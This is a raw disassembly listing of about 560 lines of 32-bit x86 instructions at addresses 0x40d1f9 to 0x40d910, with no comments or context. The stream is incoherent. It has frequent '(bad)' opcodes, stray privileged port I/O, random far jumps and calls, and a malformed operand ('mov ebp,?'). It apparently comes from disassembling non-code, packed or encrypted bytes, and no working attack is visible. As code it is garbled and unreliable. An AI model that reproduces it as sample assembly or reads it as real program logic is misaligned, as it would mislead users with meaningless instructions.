  40d1f9:	cmp    al,0x89
  40d1fb:	mov    eax,0xa105b0af
  40d200:	in     al,dx
  40d201:	gs js  0x40d269
  40d204:	push   esi
  40d205:	mov    ah,0x4e
  40d207:	xor    ecx,DWORD PTR [ecx-0x55c6e84c]
  40d20d:	(bad)  
  40d20e:	push   ebx
  40d20f:	cmp    DWORD PTR [ecx],0xf5f2e99b
  40d215:	add    eax,0x5aa7fc00
  40d21a:	inc    ebp
  40d21b:	lock fnstsw WORD PTR [ebx]
  40d21e:	adc    cl,BYTE PTR [esi]
  40d220:	shl    al,0x2e
  40d223:	xchg   ebx,eax
  40d224:	xchg   edx,eax
  40d225:	dec    edx
  40d226:	(bad)  
  40d227:	fucom  st(4)
  40d229:	ins    DWORD PTR es:[edi],dx
  40d22a:	out    dx,eax
  40d22b:	mov    ebx,0x1e904103
  40d230:	or     BYTE PTR [ebx],bh
  40d232:	clc    
  40d233:	push   0xfe94b87b
  40d238:	or     bl,al
  40d23a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d23b:	dec    edx
  40d23c:	cmc    
  40d23d:	lods   eax,DWORD PTR ss:[esi]
  40d23f:	mov    eax,ds:0x18a63386
  40d244:	scas   eax,DWORD PTR es:[edi]
  40d245:	mov    eax,0x3d2bc928
  40d24a:	in     al,0x3b
  40d24c:	ja     0x40d1e7
  40d24e:	inc    eax
  40d24f:	not    DWORD PTR [ebp-0xadcd9b1]
  40d255:	sbb    edi,DWORD PTR [eax+edx*4]
  40d258:	lea    esp,[ebp+0x24]
  40d25b:	int3   
  40d25c:	pop    eax
  40d25d:	cmp    BYTE PTR [ecx-0x10],dl
  40d260:	inc    edx
  40d261:	inc    esp
  40d262:	and    dh,BYTE PTR [eax]
  40d264:	aaa    
  40d265:	and    ch,BYTE PTR [edi-0x75]
  40d268:	jmp    0x403:0xa4621781
  40d26f:	cmp    DWORD PTR [ebp+0x5a],eax
  40d272:	push   0xffffffb5
  40d274:	rol    BYTE PTR [ebp+0x6d],cl
  40d277:	and    al,0xf5
  40d279:	cmp    ebp,ecx
  40d27b:	mov    ebx,0xa0f4ab0d
  40d280:	jbe    0x40d2b7
  40d282:	sahf   
  40d283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d284:	call   0x8b0abcea
  40d289:	cmp    eax,0x88c37b36
  40d28e:	outs   dx,BYTE PTR ds:[esi]
  40d28f:	dec    esp
  40d290:	lahf   
  40d291:	inc    ecx
  40d292:	shl    esp,0x14
  40d295:	jecxz  0x40d28a
  40d297:	cmp    BYTE PTR [eax+0x6c],ch
  40d29a:	out    dx,al
  40d29b:	jb     0x40d2a5
  40d29d:	push   edi
  40d29e:	js     0x40d2d0
  40d2a0:	cmc    
  40d2a1:	push   ecx
  40d2a2:	jbe    0x40d297
  40d2a4:	cmp    eax,0x51ae7d0a
  40d2a9:	cmp    eax,0xa3a96061
  40d2ae:	sub    al,0xe4
  40d2b0:	gs inc ebp
  40d2b2:	and    eax,0x8a312d88
  40d2b7:	aas    
  40d2b8:	(bad)  
  40d2b9:	icebp  
  40d2ba:	cmp    dl,BYTE PTR [ebx]
  40d2bc:	pop    ebx
  40d2bd:	mov    eax,0x384cd0b8
  40d2c2:	fmul   DWORD PTR [esi+0x980fb02]
  40d2c8:	xchg   edx,eax
  40d2c9:	imul   ebp,DWORD PTR [edi-0x7f],0x8c4ebf62
  40d2d0:	pop    ecx
  40d2d1:	push   eax
  40d2d2:	xchg   esi,eax
  40d2d3:	cmp    BYTE PTR [edi+eiz*8+0xd66db5d],bh
  40d2da:	lock adc eax,0x12cc6ff5
  40d2e0:	add    BYTE PTR [esi+0x3bb49bdc],dh
  40d2e6:	cdq    
  40d2e7:	(bad)  [esi+ebp*4+0x5b]
  40d2eb:	pop    esi
  40d2ec:	jne    0x40d345
  40d2ee:	ins    DWORD PTR es:[edi],dx
  40d2ef:	inc    ebp
  40d2f0:	cmc    
  40d2f1:	sbb    BYTE PTR [ebx],ah
  40d2f3:	cmp    al,0x61
  40d2f5:	into   
  40d2f6:	xchg   edx,eax
  40d2f7:	retf   
  40d2f8:	pop    edx
  40d2f9:	ss aad 0xf9
  40d2fc:	xlat   BYTE PTR ds:[ebx]
  40d2fd:	cld    
  40d2fe:	out    dx,al
  40d2ff:	and    DWORD PTR [eax-0x72],0x511492cd
  40d306:	xor    cl,0xf5
  40d309:	push   esi
  40d30a:	add    BYTE PTR [edi+0xf],ch
  40d30d:	mov    WORD PTR [eax+0x39],ss
  40d310:	jbe    0x40d31f
  40d312:	inc    eax
  40d313:	rol    edi,1
  40d315:	les    ebp,FWORD PTR [ecx]
  40d317:	fdiv   st,st(4)
  40d319:	jnp    0x40d2ab
  40d31b:	fwait
  40d31c:	cmc    
  40d31d:	mov    cl,0xaa
  40d31f:	xor    eax,0xe5eef909
  40d324:	adc    al,0x1
  40d326:	mov    cl,0x9d
  40d328:	cmp    BYTE PTR ds:[esi],bl
  40d32b:	repnz and al,0xcf
  40d32e:	sbb    eax,0xd8e4c3e1
  40d333:	inc    ebp
  40d334:	cmc    
  40d335:	out    dx,eax
  40d336:	enter  0x7763,0x8c
  40d33a:	mov    ah,BYTE PTR [edx]
  40d33c:	pop    es
  40d33d:	cmp    edi,DWORD PTR [ebx]
  40d33f:	dec    edx
  40d340:	out    0x63,eax
  40d342:	fwait
  40d343:	inc    edx
  40d344:	hlt    
  40d345:	dec    ebx
  40d346:	aad    0x6
  40d348:	cmc    
  40d349:	repz xor DWORD PTR [ecx+0x6b],edx
  40d34d:	pop    eax
  40d34e:	fmul   DWORD PTR [edx-0x1e]
  40d351:	push   cs
  40d352:	std    
  40d353:	out    dx,al
  40d354:	sub    edi,DWORD PTR [ebx]
  40d356:	inc    esp
  40d357:	or     DWORD PTR ds:0x8c75d96c,ecx
  40d35d:	stos   DWORD PTR es:[edi],eax
  40d35e:	mov    DWORD PTR [eax-0xb],esi
  40d361:	xchg   esi,eax
  40d362:	ja     0x40d3e2
  40d364:	xchg   edx,eax
  40d365:	xor    dh,bh
  40d367:	imul   esi,DWORD PTR [edx-0x1a4875c5],0xffffff82
  40d36e:	push   esi
  40d36f:	sbb    BYTE PTR [ecx-0x4c],0x82
  40d373:	pop    ds
  40d374:	fst    DWORD PTR [esi+0x6a]
  40d377:	icebp  
  40d378:	int3   
  40d379:	xchg   ebx,eax
  40d37a:	lds    esp,FWORD PTR [eax-0x2d]
  40d37d:	jle    0x40d308
  40d37f:	cmp    dh,dh
  40d381:	loopne 0x40d3b1
  40d383:	shl    bl,1
  40d385:	fwait
  40d386:	xor    DWORD PTR [ebp-0xb],esp
  40d389:	icebp  
  40d38a:	(bad)  
  40d38b:	stos   BYTE PTR es:[edi],al
  40d38c:	xchg   BYTE PTR [eax],al
  40d38e:	loopne 0x40d3db
  40d390:	sbb    DWORD PTR [eax],0xfbb43bdc
  40d396:	xchg   edx,eax
  40d397:	sbb    DWORD PTR ds:0xeca93ddb,ebp
  40d39d:	inc    ecx
  40d39e:	xor    DWORD PTR [ecx],0xffffff8d
  40d3a1:	lock in al,dx
  40d3a3:	xchg   ebx,eax
  40d3a4:	jmp    DWORD PTR [esi-0x2f6c5cf2]
  40d3aa:	outs   dx,DWORD PTR ds:[esi]
  40d3ab:	cmp    BYTE PTR [edx-0x14],ah
  40d3ae:	mov    eax,0x9a6c1d10
  40d3b3:	mov    ds:0x81e1b4f5,eax
  40d3b8:	inc    edi
  40d3b9:	jne    0x40d348
  40d3bb:	pop    es
  40d3bc:	call   0x5538:0x30dc1b1f
  40d3c3:	(bad)  
  40d3c4:	lock popa 
  40d3c6:	fwait
  40d3c7:	call   0x2347:0x5cba3cf5
  40d3ce:	jmp    0x49da:0xa091e42
  40d3d5:	cmp    ecx,esi
  40d3d7:	leave  
  40d3d8:	or     bl,0xd3
  40d3db:	mov    ebx,0x9994f8e4
  40d3e0:	rcr    BYTE PTR [ebx+0x23],0xb0
  40d3e4:	push   ecx
  40d3e5:	pop    edi
  40d3e6:	and    bh,BYTE PTR [ecx]
  40d3e8:	inc    ebp
  40d3e9:	rol    BYTE PTR [ebp-0x40c3b54b],0x6f
  40d3f0:	and    DWORD PTR [edi-0x78],esi
  40d3f3:	cmp    BYTE PTR [ecx],ch
  40d3f5:	xor    eax,eax
  40d3f7:	and    DWORD PTR [ebx-0x20],esi
  40d3fa:	out    0x1a,eax
  40d3fc:	sbb    edi,edx
  40d3fe:	iret   
  40d3ff:	mov    eax,0xc71eca9d
  40d404:	aas    
  40d405:	push   ebp
  40d406:	outs   dx,DWORD PTR ds:[esi]
  40d407:	dec    edx
  40d408:	mov    BYTE PTR [esi+ebp*1],0x3c
  40d40c:	fcmovb st,st(2)
  40d40e:	retf   0xd038
  40d411:	cld    
  40d412:	es cs stos DWORD PTR es:[edi],eax
  40d415:	pop    eax
  40d416:	lock test al,0xf6
  40d419:	jge    0x40d463
  40d41b:	adc    al,0x6f
  40d41d:	int3   
  40d41e:	shl    DWORD PTR [eax],0xa5
  40d421:	(bad)  
  40d422:	lea    edi,[eax]
  40d424:	mov    edx,0x1b6f5566
  40d429:	lock loop 0x40d476
  40d42c:	cmc    
  40d42d:	pusha  
  40d42e:	push   0x2a
  40d430:	pop    ecx
  40d431:	sub    DWORD PTR cs:[ebp+edx*2+0x3d],esp
  40d436:	inc    ebx
  40d437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d438:	dec    edx
  40d439:	add    al,0xe6
  40d43b:	xor    ch,bl
  40d43d:	jb     0x40d409
  40d43f:	jmp    0x40d42d
  40d441:	push   ebx
  40d442:	nop
  40d443:	pop    esp
  40d444:	fst    QWORD PTR [ebx+0x4f]
  40d447:	scas   al,BYTE PTR es:[edi]
  40d448:	inc    edi
  40d449:	or     eax,0xae832ae1
  40d44e:	mov    ebx,0xced635e5
  40d453:	daa    
  40d454:	cwde   
  40d455:	fs pop ecx
  40d457:	pop    edi
  40d458:	cmc    
  40d459:	ja     0x40d41c
  40d45b:	fwait
  40d45c:	aaa    
  40d45d:	sub    bl,BYTE PTR [eax-0x1a]
  40d460:	aad    0x3d
  40d462:	and    bh,BYTE PTR [ebx-0x611e5a3]
  40d468:	mov    ch,0x87
  40d46a:	pop    esi
  40d46b:	cmp    eax,0x59d330f5
  40d470:	push   ds
  40d471:	cmp    al,BYTE PTR [esi-0x5a]
  40d474:	push   0x38
  40d476:	pop    ds
  40d477:	add    ch,BYTE PTR [esi-0x3a]
  40d47a:	repz adc BYTE PTR [ebx],al
  40d47d:	aaa    
  40d47e:	dec    edx
  40d47f:	call   0x1a77da79
  40d484:	lods   al,BYTE PTR ds:[esi]
  40d485:	ds aad 0xef
  40d488:	mov    edx,0x4841213b
  40d48d:	mov    eax,ds:0xd63e904a
  40d492:	outs   dx,DWORD PTR ds:[esi]
  40d493:	adc    bh,0x95
  40d496:	push   esi
  40d497:	sbb    ebx,DWORD PTR [ecx-0x538f509b]
  40d49d:	xor    eax,0x20f839e4
  40d4a2:	sbb    DWORD PTR [eax+eax*2-0x7a],esi
  40d4a6:	or     BYTE PTR [ebp-0x2],ch
  40d4a9:	loope  0x40d48e
  40d4ab:	loope  0x40d4c0
  40d4ad:	dec    ecx
  40d4ae:	mov    ah,BYTE PTR ds:0x40dc6fa8
  40d4b4:	sub    eax,0xa6cf9320
  40d4b9:	xor    BYTE PTR [edi-0x7c],ah
  40d4bc:	xchg   esp,eax
  40d4bd:	xchg   esi,eax
  40d4be:	jae    0x40d518
  40d4c0:	push   ds
  40d4c1:	(bad)  
  40d4c2:	pop    ds
  40d4c3:	shl    BYTE PTR [edx-0x8],cl
  40d4c6:	(bad)  
  40d4c7:	shr    BYTE PTR [eax+0x751d0d53],0xbe
  40d4ce:	pop    es
  40d4cf:	fs mov edx,0xab5f4fa4
  40d4d5:	cmp    ebp,DWORD PTR [eax+0x5e39e651]
  40d4db:	(bad)  [ebp+0x18876f25]
  40d4e1:	push   ds
  40d4e2:	mov    esi,0x6ff152b6
  40d4e7:	cmp    BYTE PTR [eax],cl
  40d4e9:	pop    ebx
  40d4ea:	jmp    0x40d4ef
  40d4ec:	stc    
  40d4ed:	jge    0x40d4f3
  40d4ef:	or     ebp,edx
  40d4f1:	sub    eax,0x8a0ddc88
  40d4f6:	cs test eax,0x38eeda6a
  40d4fc:	ds adc al,0xc
  40d4ff:	xchg   esi,eax
  40d500:	mov    ch,0xff
  40d502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d504:	jmp    0x6037:0xec4a314c
  40d50b:	cmp    DWORD PTR [edi-0x1ae310e7],edx
  40d511:	aad    0x6e
  40d513:	jg     0x40d50d
  40d515:	enter  0xf67c,0x75
  40d519:	push   cs
  40d51a:	pop    ss
  40d51b:	cmp    DWORD PTR [ecx+0x75],esp
  40d51e:	retf   0x8573
  40d521:	xor    bh,BYTE PTR [esi]
  40d523:	test   al,0xcf
  40d525:	push   ss
  40d526:	outs   dx,BYTE PTR ds:[esi]
  40d527:	mov    dh,0x15
  40d529:	iret   
  40d52a:	rcl    BYTE PTR [edi-0x6e],1
  40d52d:	push   ds
  40d52e:	adc    esi,DWORD PTR [eax]
  40d530:	stos   BYTE PTR es:[edi],al
  40d531:	popa   
  40d532:	js     0x40d503
  40d534:	mov    bh,bl
  40d536:	pusha  
  40d537:	bound  edx,QWORD PTR [eax+ebp*8-0x41696392]
  40d53e:	xor    dh,BYTE PTR ds:0x3913316b
  40d544:	in     al,0xe8
  40d546:	mov    dh,0xe0
  40d548:	pop    esi
  40d549:	js     0x40d4e8
  40d54b:	sahf   
  40d54c:	sbb    edx,DWORD PTR [edi+ebp*4-0x76f0adf]
  40d553:	xor    DWORD PTR [esi-0x51d53ebb],edx
  40d559:	pop    ecx
  40d55a:	jl     0x40d52a
  40d55c:	jne    0x40d4e6
  40d55e:	cmp    DWORD PTR ds:0x4a6ee978,ecx
  40d564:	add    DWORD PTR [esi-0x70],esp
  40d567:	dec    ebp
  40d568:	pushf  
  40d569:	push   edi
  40d56a:	jo     0x40d5a4
  40d56c:	ins    DWORD PTR es:[edi],dx
  40d56d:	ret    
  40d56e:	jae    0x40d57e
  40d570:	lea    ebp,[ebx]
  40d572:	and    eax,0x26821bcb
  40d577:	(bad)  
  40d578:	in     al,dx
  40d579:	mov    ah,0x31
  40d57b:	pop    esp
  40d57c:	inc    ebp
  40d57d:	aad    0xf2
  40d57f:	xor    eax,0x2f50384c
  40d584:	out    dx,al
  40d585:	inc    esp
  40d586:	adc    BYTE PTR [ebp+0x47],ch
  40d589:	outs   dx,DWORD PTR ds:[esi]
  40d58a:	outs   dx,DWORD PTR ds:[esi]
  40d58b:	inc    eax
  40d58c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d58d:	popf   
  40d58e:	arpl   ax,si
  40d590:	aas    
  40d591:	cmp    eax,0xe03638db
  40d596:	loop   0x40d57e
  40d598:	inc    esi
  40d599:	jg     0x40d5a8
  40d59b:	ja     0x40d592
  40d59d:	pop    eax
  40d59e:	add    al,0x4b
  40d5a0:	push   ecx
  40d5a1:	sub    al,0x30
  40d5a3:	mov    cl,0x67
  40d5a5:	cmp    BYTE PTR [ecx+0x5d],dh
  40d5a8:	fstp   QWORD PTR [esi+edx*1]
  40d5ab:	ret    
  40d5ac:	aam    0x16
  40d5ae:	outs   dx,BYTE PTR ds:[esi]
  40d5af:	add    DWORD PTR [ebx],edx
  40d5b1:	inc    esi
  40d5b2:	cmp    dh,BYTE PTR [esi+0x23ed9100]
  40d5b8:	cmp    DWORD PTR [ebp-0x1dabc201],0x8730bc22
  40d5c2:	(bad)  
  40d5c3:	mov    bl,0x8b
  40d5c5:	int3   
  40d5c6:	outs   dx,BYTE PTR ds:[esi]
  40d5c7:	in     eax,0x22
  40d5c9:	fisttp DWORD PTR [esi-0x556ecc0c]
  40d5cf:	cmp    BYTE PTR [eax],ch
  40d5d1:	xchg   ebp,eax
  40d5d2:	cmp    edx,ecx
  40d5d4:	and    BYTE PTR [edi+ebp*4-0x3afb163a],cl
  40d5db:	icebp  
  40d5dc:	out    0xa1,eax
  40d5de:	cs repz mov esp,0x17389297
  40d5e5:	and    eax,edx
  40d5e7:	adc    ecx,edx
  40d5e9:	ret    
  40d5ea:	in     al,dx
  40d5eb:	cmp    dl,BYTE PTR [ecx]
  40d5ed:	mov    ah,0x78
  40d5ef:	add    al,0x75
  40d5f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5f2:	(bad)  
  40d5f3:	fldcw  WORD PTR [ebx]
  40d5f5:	loop   0x40d659
  40d5f7:	add    DWORD PTR [ecx],ebx
  40d5f9:	push   edx
  40d5fa:	and    bl,ah
  40d5fc:	jne    0x40d58f
  40d5fe:	inc    edx
  40d5ff:	dec    esp
  40d600:	mov    ecx,0xf55a0c94
  40d605:	pop    esi
  40d606:	in     al,dx
  40d607:	mov    bl,BYTE PTR [esi+0x3cd43c09]
  40d60d:	or     DWORD PTR [edi-0x10a29e44],eax
  40d613:	push   ebx
  40d614:	jno    0x40d66b
  40d616:	fldenv [ebx]
  40d618:	cmc    
  40d619:	inc    edi
  40d61a:	test   eax,0x9196a2cb
  40d61f:	or     bl,BYTE PTR [eax-0x435fe9c5]
  40d625:	and    ecx,DWORD PTR [eax+ebx*2+0x736ee288]
  40d62c:	fbstp  TBYTE PTR [edi-0x3d]
  40d62f:	cli    
  40d630:	jmp    0xdd79c4c4
  40d635:	fimul  WORD PTR [ecx-0x37]
  40d638:	sbb    eax,0xf584bd69
  40d63d:	loope  0x40d665
  40d63f:	jmp    0x5d5503f8
  40d644:	lods   al,BYTE PTR ds:[esi]
  40d645:	cmp    ebx,eax
  40d647:	inc    ebx
  40d648:	or     al,BYTE PTR ss:[ebp-0xf]
  40d64c:	jns    0x40d603
  40d64e:	outs   dx,BYTE PTR ds:[esi]
  40d64f:	inc    esp
  40d650:	and    DWORD PTR [edi-0x4584f11e],edx
  40d656:	stos   DWORD PTR es:[edi],eax
  40d657:	ds adc dl,bh
  40d65a:	std    
  40d65b:	js     0x40d695
  40d65d:	ins    BYTE PTR es:[edi],dx
  40d65e:	sub    ah,BYTE PTR [eax]
  40d660:	aad    0xab
  40d662:	int    0x53
  40d664:	ds call 0x1fb1f8dc
  40d66a:	jge    0x40d65c
  40d66c:	in     al,0x98
  40d66e:	sub    esi,DWORD PTR [esi+0x14]
  40d671:	adc    BYTE PTR [ebp+0x39],bl
  40d674:	(bad)  
  40d675:	mov    cl,0xd1
  40d677:	fld    st(6)
  40d679:	ficom  WORD PTR [edx]
  40d67b:	lock cmc 
  40d67d:	not    DWORD PTR [edi+0x70]
  40d680:	sub    cl,ah
  40d682:	fimul  WORD PTR [esi]
  40d684:	fdivr  QWORD PTR [ebx]
  40d686:	scas   al,BYTE PTR es:[edi]
  40d687:	push   ebp
  40d688:	sbb    eax,0xf27aa591
  40d68d:	(bad)  
  40d68f:	fs ret 
  40d691:	movd   mm3,DWORD PTR [edx+0x5f]
  40d695:	out    dx,al
  40d696:	cmp    cl,BYTE PTR [ebp-0x59]
  40d699:	stos   DWORD PTR es:[edi],eax
  40d69a:	dec    esi
  40d69b:	cmp    DWORD PTR [eax-0x2f740035],ebx
  40d6a1:	sub    DWORD PTR [esi+0x66],ebp
  40d6a4:	adc    DWORD PTR [edi-0x124a202c],edx
  40d6aa:	aad    0x2f
  40d6ac:	pusha  
  40d6ad:	jmp    0x36d21051
  40d6b2:	push   ebx
  40d6b3:	xchg   dl,ch
  40d6b5:	out    0xf7,al
  40d6b7:	sbb    BYTE PTR [eax-0x35],dl
  40d6ba:	outs   dx,BYTE PTR ds:[esi]
  40d6bb:	xchg   edi,eax
  40d6bc:	jecxz  0x40d739
  40d6be:	lds    edx,FWORD PTR [eax+0x38e54ee9]
  40d6c4:	pop    eax
  40d6c5:	sub    BYTE PTR [ecx+0x2527d61b],ah
  40d6cb:	mov    ebp,?
  40d6cd:	xchg   esp,eax
  40d6ce:	ss scas al,BYTE PTR es:[edi]
  40d6d0:	adc    eax,0x8c9bde82
  40d6d5:	cmp    ecx,DWORD PTR [eax-0x67]
  40d6d8:	jge    0x40d717
  40d6da:	dec    edx
  40d6db:	add    eax,0xa16e00c7
  40d6e0:	ins    DWORD PTR es:[edi],dx
  40d6e1:	and    esi,DWORD PTR [ebx]
  40d6e3:	mov    esp,0x393b1c4c
  40d6e8:	pop    ecx
  40d6e9:	mov    edi,0xaaa620d8
  40d6ee:	into   
  40d6ef:	adc    eax,0xa6ec079
  40d6f4:	(bad)  
  40d6f5:	retf   
  40d6f6:	jl     0x40d6b4
  40d6f8:	in     al,dx
  40d6f9:	scas   eax,DWORD PTR es:[edi]
  40d6fa:	and    al,0x39
  40d6fc:	mov    ebp,0xc09a8783
  40d701:	(bad)  
  40d702:	or     esi,eax
  40d704:	stc    
  40d705:	cmc    
  40d706:	outs   dx,BYTE PTR ds:[esi]
  40d707:	rcr    ch,cl
  40d709:	xor    al,0x4a
  40d70b:	jle    0x40d774
  40d70d:	in     al,dx
  40d70e:	loop   0x40d748
  40d710:	sbb    al,0x71
  40d712:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d714:	mov    al,ds:0xf51579fb
  40d719:	xchg   DWORD PTR [edx-0x6de24d43],esi
  40d71f:	mov    esi,0xfaa3805
  40d724:	shl    BYTE PTR [ecx-0x32],cl
  40d727:	sbb    esp,0x61
  40d72a:	outs   dx,DWORD PTR ds:[esi]
  40d72b:	cmp    eax,0x7f9cd014
  40d730:	cs mov dl,0xab
  40d733:	xor    edi,DWORD PTR [edi]
  40d735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d736:	mov    bh,BYTE PTR [esi+eax*2]
  40d739:	or     cl,bh
  40d73b:	and    cl,bl
  40d73d:	fwait
  40d73e:	outs   dx,BYTE PTR ds:[esi]
  40d73f:	sti    
  40d740:	popf   
  40d741:	push   ds
  40d742:	pop    es
  40d743:	push   edi
  40d744:	enter  0x6d29,0x39
  40d748:	dec    esi
  40d749:	inc    eax
  40d74a:	mov    dl,0xd4
  40d74c:	mov    ds:0x7456627e,eax
  40d751:	retf   0x91a7
  40d754:	mov    dh,0xbb
  40d756:	pop    ds
  40d757:	cli    
  40d758:	or     DWORD PTR [edi-0x1c],ebp
  40d75b:	rcr    BYTE PTR [ebp+0x38],0x45
  40d75f:	sub    al,BYTE PTR [ebx+0x1a]
  40d762:	int3   
  40d763:	sub    eax,0xb46e069c
  40d768:	loope  0x40d7b3
  40d76a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d76b:	pop    esi
  40d76d:	mov    al,0xc9
  40d76f:	cmp    BYTE PTR [edi+0x4c],dl
  40d772:	jle    0x40d6ff
  40d774:	mov    al,ds:0xec782364
  40d779:	div    DWORD PTR [ebp-0x70d2af61]
  40d77f:	dec    ebx
  40d780:	retf   
  40d781:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d782:	jno    0x40d724
  40d784:	fdivr  QWORD PTR ds:0x6d591a62
  40d78a:	test   BYTE PTR [eax],dh
  40d78c:	aad    0x9d
  40d78e:	rcl    DWORD PTR [edi-0x30912f2b],cl
  40d794:	out    0xf5,eax
  40d796:	and    al,0x48
  40d798:	mov    ch,0x38
  40d79a:	jmp    0x40d7d4
  40d79c:	inc    ebx
  40d79d:	iret   
  40d79e:	push   ebp
  40d79f:	(bad)  
  40d7a0:	(bad)  
  40d7a1:	pusha  
  40d7a2:	scas   eax,DWORD PTR es:[edi]
  40d7a3:	xor    edi,ebp
  40d7a5:	retf   
  40d7a6:	outs   dx,BYTE PTR ds:[esi]
  40d7a7:	cwde   
  40d7a8:	xchg   edi,eax
  40d7a9:	sub    BYTE PTR [ecx-0x73a87838],0xa
  40d7b0:	ins    BYTE PTR es:[edi],dx
  40d7b1:	pop    ecx
  40d7b2:	retf   
  40d7b3:	cmp    BYTE PTR [edi+0x2],bh
  40d7b6:	iret   
  40d7b7:	lods   al,BYTE PTR ds:[esi]
  40d7b8:	rcr    al,0x6e
  40d7bb:	shr    BYTE PTR [edi],cl
  40d7bd:	gs inc ecx
  40d7bf:	inc    esp
  40d7c0:	jmp    0x29e0:0x163946d5
  40d7c7:	das    
  40d7c8:	xchg   DWORD PTR [ebx+0x5572937d],ebp
  40d7ce:	outs   dx,DWORD PTR ds:[esi]
  40d7cf:	sub    BYTE PTR [ebx-0x40936e1b],dl
  40d7d5:	std    
  40d7d6:	add    esi,DWORD PTR [eax]
  40d7d8:	push   ecx
  40d7d9:	jae    0x40d805
  40d7db:	adc    ch,dh
  40d7dd:	pop    eax
  40d7de:	xchg   ebp,eax
  40d7df:	jns    0x40d780
  40d7e1:	jmp    0xf5366448
  40d7e6:	leave  
  40d7e7:	addr16 aam 0x21
  40d7ea:	fstp   QWORD PTR [eax]
  40d7ec:	jle    0x40d81c
  40d7ee:	inc    eax
  40d7ef:	cmp    DWORD PTR [eax],eax
  40d7f1:	dec    edx
  40d7f2:	jp     0x40d828
  40d7f4:	bound  edi,QWORD PTR [edi]
  40d7f6:	mov    ah,bh
  40d7f8:	jo     0x40d875
  40d7fa:	(bad)  
  40d7fc:	cmc    
  40d7fd:	and    esp,edi
  40d7ff:	fisub  WORD PTR [esi+0x3a16b6b9]
  40d805:	mov    ecx,0x23be3dce
  40d80a:	jbe    0x40d86f
  40d80c:	jo     0x40d886
  40d80e:	jmp    0x6f9a72a8
  40d813:	(bad)
  40d817:	dec    edi
  40d818:	mov    cl,0x1
  40d81a:	nop
  40d81b:	aas    
  40d81c:	les    esp,FWORD PTR [edi]
  40d81e:	pop    es
  40d81f:	call   0x655fb13e
  40d824:	push   edx
  40d825:	xchg   ebx,eax
  40d826:	outs   dx,BYTE PTR ds:[esi]
  40d827:	fiadd  DWORD PTR [ebp+esi*4+0x58]
  40d82b:	iret   
  40d82c:	xor    dh,BYTE PTR [ecx]
  40d82e:	lods   eax,DWORD PTR ds:[esi]
  40d82f:	ds hlt 
  40d831:	int    0xff
  40d833:	cmp    DWORD PTR [eax+0x3a],ebx
  40d836:	test   eax,0x6affdd5
  40d83b:	inc    eax
  40d83c:	cmc    
  40d83d:	sub    cl,cl
  40d83f:	mov    al,0x12
  40d841:	push   ecx
  40d842:	pop    esp
  40d843:	cmp    eax,0x39542c6b
  40d848:	mov    ch,0x2c
  40d84a:	inc    eax
  40d84b:	inc    ecx
  40d84c:	outs   dx,BYTE PTR ds:[esi]
  40d84d:	pop    ebx
  40d84e:	mov    dh,0xca
  40d850:	ds mov edi,0x5150389a
  40d856:	push   es
  40d857:	test   cl,ah
  40d859:	mov    al,0x4
  40d85b:	sbb    cl,bl
  40d85d:	call   0x7862b364
  40d862:	iret   
  40d863:	mov    edi,0x59996f16
  40d868:	xor    al,0x88
  40d86a:	push   edx
  40d86b:	ret    0x7cf5
  40d86e:	lea    ecx,[ebp+ebp*8+0x66]
  40d872:	cli    
  40d873:	cld    
  40d874:	and    edi,DWORD PTR [eax]
  40d876:	push   0xfffffff7
  40d878:	out    0xf,al
  40d87a:	enter  0x363e,0x8b
  40d87e:	mov    eax,ds:0xd5bb8191
  40d883:	lods   al,BYTE PTR ds:[esi]
  40d884:	jo     0x40d88e
  40d886:	(bad)  
  40d888:	std    
  40d889:	and    eax,0x382bc965
  40d88e:	test   al,0xa0
  40d890:	stos   DWORD PTR es:[edi],eax
  40d891:	dec    ebp
  40d892:	push   ebx
  40d893:	sbb    BYTE PTR [edx-0x25],dl
  40d896:	outs   dx,BYTE PTR ds:[esi]
  40d897:	inc    esi
  40d898:	pop    edx
  40d899:	add    eax,0x12a08ac9
  40d89e:	cmp    al,0x39
  40d8a0:	xchg   edi,eax
  40d8a1:	xor    al,BYTE PTR [edi]
  40d8a3:	jae    0x40d83a
  40d8a5:	addr16 inc ecx
  40d8a7:	xor    ebp,0x2
  40d8aa:	in     al,dx
  40d8ab:	stos   BYTE PTR es:[edi],al
  40d8ac:	imul   edi,DWORD PTR [ebp+0x3830f7f3],0xffffffa2
  40d8b3:	pop    edi
  40d8b4:	retw   
  40d8b6:	cmp    ebp,esi
  40d8b8:	sbb    esi,edx
  40d8ba:	outs   dx,BYTE PTR ds:[esi]
  40d8bb:	js     0x40d871
  40d8bd:	repnz les ebp,FWORD PTR [ecx-0x4]
  40d8c1:	ds add eax,0x69959939
  40d8c7:	jb     0x40d8ff
  40d8c9:	xchg   ebx,eax
  40d8ca:	pop    esp
  40d8cb:	xchg   esp,eax
  40d8cc:	cmc    
  40d8cd:	pop    ss
  40d8ce:	ins    DWORD PTR es:[edi],dx
  40d8cf:	in     al,dx
  40d8d0:	or     esp,eax
  40d8d2:	call   0x86c8:0xf83b820a
  40d8d9:	dec    edi
  40d8da:	in     eax,0x68
  40d8dc:	lahf   
  40d8dd:	jge    0x40d94e
  40d8df:	xchg   DWORD PTR [ebp-0x1d],edx
  40d8e2:	(bad)  
  40d8e3:	(bad)  
  40d8e4:	ret    
  40d8e5:	ficomp DWORD PTR [esi+0xcac3138]
  40d8eb:	(bad)  
  40d8ed:	mov    al,0x62
  40d8ef:	mov    bl,0xf5
  40d8f1:	outs   dx,DWORD PTR ds:[esi]
  40d8f2:	das    
  40d8f3:	mov    al,BYTE PTR [esi]
  40d8f5:	sub    BYTE PTR [edi+0x27380c14],0x93
  40d8fc:	inc    esi
  40d8fd:	pop    es
  40d8fe:	out    0xf5,al
  40d900:	add    BYTE PTR [esi],dh
  40d902:	pop    eax
  40d903:	xchg   ebp,eax
  40d904:	cmc    
  40d905:	std    
  40d906:	cmp    eax,0xc0158498
  40d90b:	fldenv [edi+0x38]
  40d90e:	or     BYTE PTR [edx],cl
  40d910:	push   edi
